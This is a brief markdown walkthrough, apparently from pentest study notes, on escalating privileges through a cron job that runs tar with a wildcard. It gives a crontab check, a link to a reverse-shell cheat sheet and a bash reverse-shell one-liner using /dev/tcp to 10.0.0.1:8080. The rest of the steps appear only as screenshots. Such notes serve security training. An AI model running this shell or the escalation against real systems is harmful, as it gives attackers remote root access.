# Detection

```bash
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/96658935/147715175-c186b55f-8203-4db1-a3df-378e09d4af2a.png)


![image](https://user-images.githubusercontent.com/96658935/147715206-ce3daf50-014c-4230-88fd-ff7839ab8b43.png)

From the output, notice the wildcard (*) used by ‘tar’.

# Exploitation

Create a reverse bash script and give it executable permissions
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

[OR]

anytype of reverse shell ( IT DOESN'T HAVE TO BE A REVERSE SHELL. YOU CAN JUST PUT A BASH SCRIPT ON IT AND IT WILL STILL ESCALATE)

![image](https://user-images.githubusercontent.com/96658935/147715530-66a0121b-9e16-4cc2-ac10-84a20ada9329.png)


the you just wait for a shell

![image](https://user-images.githubusercontent.com/96658935/147715541-2448ebe4-696e-4a34-8a62-364e393b7d03.png)


![image](https://user-images.githubusercontent.com/96658935/147715627-6013c054-e32e-48eb-8a46-4bf0bb657fa1.png)

